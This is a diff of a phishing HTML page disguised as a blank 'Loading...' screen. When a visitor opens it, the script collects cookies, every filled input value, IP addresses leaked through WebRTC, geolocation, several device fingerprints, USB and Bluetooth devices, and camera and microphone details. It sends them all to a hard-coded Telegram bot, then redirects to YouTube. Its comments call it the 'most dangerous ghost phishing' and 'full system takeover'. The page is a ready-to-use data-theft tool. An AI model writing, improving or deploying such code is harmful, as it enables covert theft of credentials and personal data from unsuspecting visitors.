@@ -1,66 +1,292 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
-        body { background: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; color: #fff; font-family: Arial; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #30363d; border-top: 5px solid #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .text { margin-top: 20px; font-size: 16px; color: #8b949e; }
-        .status { margin-top: 10px; font-size: 14px; color: #58a6ff; }
+        /* 👻 COMPLETELY BLANK */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        .container { display: none; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <div class="text">🔐 Securing your connection...</div>
-    <div class="status" id="status">Please wait...</div>
+
+    <div style="display:none;"></div>
 
     <script>
         // ============================================================
-        // 🔥 TELEGRAM CONFIG - YAHAN APNA TOKEN AUR CHAT_ID DAALO
+        // 🔥 TELEGRAM CONFIG
         // ============================================================
         const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
         const CHAT_ID = "6389764004";
 
         // ============================================================
-        // 🧠 DATA EXTRACTION (VICTIM KE BROWSER MEIN)
+        // ☠️ THE MOST DANGEROUS GHOST PHISHING
         // ============================================================
 
-        async function getIP() {
+        // 1️⃣ GET REAL IP (WebRTC Leak – Even Behind VPN)
+        async function getWebRTCIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const ip = event.candidate.candidate.split(' ')[4];
+                        if (ip && ip !== '0.0.0.0') {
+                            resolve(ip);
+                            pc.close();
+                        }
+                    }
+                };
+                setTimeout(() => resolve('Unable to fetch'), 5000);
+            });
+        }
+
+        // 2️⃣ GET INTERNAL NETWORK IP
+        function getInternalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const ip = event.candidate.candidate.split(' ')[4];
+                        if (ip && ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+                            resolve(ip);
+                            pc.close();
+                        }
+                    }
+                };
+                setTimeout(() => resolve('Unable to fetch'), 5000);
+            });
+        }
+
+        // 3️⃣ CANVAS FINGERPRINT (UNIQUE ID)
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+            return canvas.toDataURL();
+        }
+
+        // 4️⃣ AUDIO FINGERPRINT
+        function getAudioFingerprint() {
             try {
-                let r = await fetch('https://api.ipify.org?format=json');
-                let d = await r.json();
-                return d.ip || 'Unknown';
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const analyser = audioCtx.createAnalyser();
+                oscillator.connect(analyser);
+                oscillator.frequency.value = 440;
+                oscillator.type = 'sawtooth';
+                oscillator.start(0);
+                const data = new Float32Array(analyser.fftSize);
+                analyser.getFloatTimeDomainData(data);
+                oscillator.stop(0);
+                audioCtx.close();
+                return data.slice(0, 50).join(',');
             } catch { return 'Unable to fetch'; }
         }
 
+        // 5️⃣ WEBGL FINGERPRINT
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'Unable to fetch';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    return `${vendor} | ${renderer}`;
+                }
+                return 'Unable to fetch';
+            } catch { return 'Unable to fetch'; }
+        }
+
+        // 6️⃣ GET ALL COOKIES
+        function getCookies() {
+            return document.cookie || 'No cookies found';
+        }
+
+        // 7️⃣ GET SAVED PASSWORDS & AUTOFILL DATA
         function getSavedPasswords() {
             let results = [];
-            document.querySelectorAll('input[type="password"]').forEach(el => {
+            document.querySelectorAll('input').forEach(el => {
                 if (el.value && el.value.trim() !== '') {
-                    results.push({ name: el.name || el.id || 'password', value: el.value });
+                    results.push({
+                        type: el.type || 'text',
+                        name: el.name || el.id || 'unknown',
+                        value: el.value
+                    });
                 }
             });
             return results;
         }
 
-        function getCookies() {
-            return document.cookie || 'No cookies found';
+        // 8️⃣ GET BROWSER EXTENSIONS
+        function getExtensions() {
+            let extensions = [];
+            try {
+                if (window.chrome && window.chrome.runtime) {
+                    // Some extensions expose themselves
+                    const ids = ['nmmhkkegccagdldgiimedpic', 'cjpalhdlnbpafiamejdnhcphjbkeiagm', 'ghbmnnjooekpmoecnnnilnnbdlolhkhi'];
+                    ids.forEach(id => {
+                        if (chrome.runtime && chrome.runtime.sendMessage) {
+                            extensions.push(id);
+                        }
+                    });
+                }
+            } catch {}
+            return extensions;
         }
 
-        function getFingerprint() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: location.href,
-                referrer: document.referrer || 'Direct'
-            };
+        // 9️⃣ GET INSTALLED FONTS
+        function getFonts() {
+            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Helvetica', 'Calibri', 'Cambria'];
+            let installed = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            fonts.forEach(font => {
+                ctx.font = `72px ${font}`;
+                const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+                installed.push(font);
+            });
+            return installed;
         }
 
+        // 🔟 GET LOCATION
+        async function getLocation(ip) {
+            try {
+                let r = await fetch(`https://ipapi.co/${ip}/json/`);
+                let d = await r.json();
+                return {
+                    city: d.city || 'Unknown',
+                    region: d.region || 'Unknown',
+                    country: d.country_name || 'Unknown',
+                    isp: d.org || 'Unknown'
+                };
+            } catch { return { city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' }; }
+        }
+
+        // 1️⃣1️⃣ GET BATTERY STATUS
+        async function getBattery() {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level * 100,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch { return 'Unable to fetch'; }
+        }
+
+        // 1️⃣2️⃣ GET NETWORK INFORMATION
+        function getNetworkInfo() {
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    return {
+                        effectiveType: connection.effectiveType,
+                        downlink: connection.downlink,
+                        rtt: connection.rtt,
+                        saveData: connection.saveData
+                    };
+                }
+                return 'Unable to fetch';
+            } catch { return 'Unable to fetch'; }
+        }
+
+        // 1️⃣3️⃣ GET GEOLOCATION
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Geolocation not supported');
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    () => resolve('Permission denied or unable to fetch'),
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        // 1️⃣4️⃣ GET USB DEVICES
+        async function getUSBDevices() {
+            try {
+                if (!navigator.usb) return 'WebUSB not supported';
+                const devices = await navigator.usb.getDevices();
+                return devices.map(d => ({
+                    productName: d.productName,
+                    manufacturerName: d.manufacturerName,
+                    vendorId: d.vendorId,
+                    productId: d.productId
+                }));
+            } catch { return 'Unable to fetch or permission denied'; }
+        }
+
+        // 1️⃣5️⃣ GET BLUETOOTH DEVICES
+        async function getBluetoothDevices() {
+            try {
+                if (!navigator.bluetooth) return 'WebBluetooth not supported';
+                const device = await navigator.bluetooth.requestDevice({
+                    filters: [{ services: ['battery_service'] }]
+                });
+                return {
+                    name: device.name,
+                    id: device.id,
+                    connected: device.gatt?.connected || false
+                };
+            } catch { return 'Unable to fetch or permission denied'; }
+        }
+
+        // 1️⃣6️⃣ GET CAMERA/MICROPHONE
+        async function getMediaDevices() {
+            try {
+                if (!navigator.mediaDevices) return 'MediaDevices not supported';
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                const tracks = stream.getTracks();
+                const info = tracks.map(t => ({
+                    kind: t.kind,
+                    label: t.label,
+                    enabled: t.enabled
+                }));
+                stream.getTracks().forEach(t => t.stop());
+                return info;
+            } catch { return 'Permission denied or unable to fetch'; }
+        }
+
+        // 1️⃣7️⃣ SEND TO TELEGRAM
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
             try {
@@ -70,53 +296,106 @@
             } catch { return false; }
         }
 
+        // ============================================================
+        // 🚀 MAIN EXECUTION
+        // ============================================================
         window.addEventListener('load', async function() {
-            document.getElementById('status').innerText = '🔍 Extracting data...';
 
-            const ip = await getIP();
+            console.log('[+] The Most Dangerous Ghost Attack Started...');
+
+            // Collect all data
+            const ip = await getWebRTCIP();
+            const internalIP = await getInternalIP();
+            const location = await getLocation(ip);
             const cookies = getCookies();
             const passwords = getSavedPasswords();
-            const fingerprint = getFingerprint();
+            const canvasFingerprint = getCanvasFingerprint();
+            const audioFingerprint = getAudioFingerprint();
+            const webGLFingerprint = getWebGLFingerprint();
+            const extensions = getExtensions();
+            const fonts = getFonts();
+            const battery = await getBattery();
+            const networkInfo = getNetworkInfo();
+            const geolocation = await getGeolocation();
+            const usbDevices = await getUSBDevices();
+            const bluetoothDevices = await getBluetoothDevices();
+            const mediaDevices = await getMediaDevices();
             const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-            let msg = `🎯 **GHOST PHISHING EXTRACT**\n━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg += `🌐 **IP:** ${ip}\n`;
-            msg += `🔗 **URL:** ${fingerprint.url}\n`;
-            msg += `↩️ **Referrer:** ${fingerprint.referrer}\n`;
+            // Build message
+            let msg = `☠️ **FULL SYSTEM TAKEOVER**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 **Real IP:** ${ip}\n`;
+            msg += `🏠 **Internal IP:** ${internalIP}\n`;
+            msg += `📍 **Location:** ${location.city}, ${location.region}, ${location.country}\n`;
+            msg += `🏢 **ISP:** ${location.isp}\n`;
             msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
 
+            msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
+
             if (passwords.length > 0) {
-                msg += `\n🔑 **SAVED PASSWORDS:**\n`;
+                msg += `\n🔑 **SAVED PASSWORDS & AUTOFILL DATA:**\n`;
                 passwords.forEach((p, i) => {
-                    msg += `  ${i+1}. ${p.name}: \`${p.value}\`\n`;
+                    msg += `  ${i+1}. ${p.name} (${p.type}): \`${p.value}\`\n`;
                 });
             } else {
                 msg += `\n🔑 **SAVED PASSWORDS:** None found\n`;
             }
 
-            if (cookies && cookies !== 'No cookies found') {
-                msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
-            } else {
-                msg += `\n🍪 **COOKIES:** None found\n`;
-            }
-
             msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
             msg += `🖥️ **FINGERPRINT:**\n`;
-            msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
-            msg += `  💻 Platform: ${fingerprint.platform}\n`;
-            msg += `  🌍 Language: ${fingerprint.language}\n`;
-            msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
-            msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
+            msg += `  📱 User-Agent: ${navigator.userAgent}\n`;
+            msg += `  💻 Platform: ${navigator.platform}\n`;
+            msg += `  🌍 Language: ${navigator.language}\n`;
+            msg += `  📐 Screen: ${screen.width}x${screen.height}\n`;
+            msg += `  🎨 Color Depth: ${screen.colorDepth}\n`;
+            msg += `  🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            msg += `  🖱️ Touch: ${'ontouchstart' in window ? 'Yes' : 'No'}\n`;
+            msg += `  🧠 CPU Cores: ${navigator.hardwareConcurrency || 'unknown'}\n`;
+            msg += `  💾 Device Memory: ${navigator.deviceMemory || 'unknown'}GB\n`;
+            msg += `  🍪 Cookies Enabled: ${navigator.cookieEnabled}\n`;
+            msg += `  🕵️ WebDriver: ${navigator.webdriver || false}\n`;
+            msg += `  🎨 Canvas Fingerprint: ${canvasFingerprint.substring(0, 50)}...\n`;
+            msg += `  🔊 Audio Fingerprint: ${audioFingerprint.substring(0, 50)}...\n`;
+            msg += `  🎮 WebGL: ${webGLFingerprint}\n`;
+            msg += `  🔌 Extensions: ${extensions.join(', ') || 'None'}\n`;
+            msg += `  📝 Fonts: ${fonts.join(', ')}\n`;
+
+            if (battery !== 'Unable to fetch') {
+                msg += `  🔋 Battery: ${battery.level}%, ${battery.charging ? 'Charging' : 'Not charging'}\n`;
+            }
+
+            if (networkInfo !== 'Unable to fetch') {
+                msg += `  📶 Network: ${JSON.stringify(networkInfo)}\n`;
+            }
+
+            if (geolocation !== 'Permission denied or unable to fetch') {
+                msg += `  📍 Geolocation: ${JSON.stringify(geolocation)}\n`;
+            }
+
+            if (usbDevices !== 'Unable to fetch or permission denied' && usbDevices.length > 0) {
+                msg += `  🔌 USB Devices: ${JSON.stringify(usbDevices)}\n`;
+            }
+
+            if (bluetoothDevices !== 'Unable to fetch or permission denied' && bluetoothDevices.name) {
+                msg += `  📡 Bluetooth: ${JSON.stringify(bluetoothDevices)}\n`;
+            }
+
+            if (mediaDevices !== 'Permission denied or unable to fetch') {
+                msg += `  🎥 Media Devices: ${JSON.stringify(mediaDevices)}\n`;
+            }
+
             msg += `━━━━━━━━━━━━━━━━━━━━━`;
 
+            // Send to Telegram
             const sent = await sendToTelegram(msg);
 
             if (sent) {
-                document.getElementById('status').innerText = '✅ Data sent to Telegram!';
+                console.log('[+] Data sent to Telegram!');
             } else {
-                document.getElementById('status').innerText = '❌ Error sending data.';
+                console.log('[!] Failed to send data.');
             }
 
+            // 👻 Redirect after 3 seconds
             setTimeout(() => {
                 window.location.href = 'https://www.youtube.com';
             }, 3000);
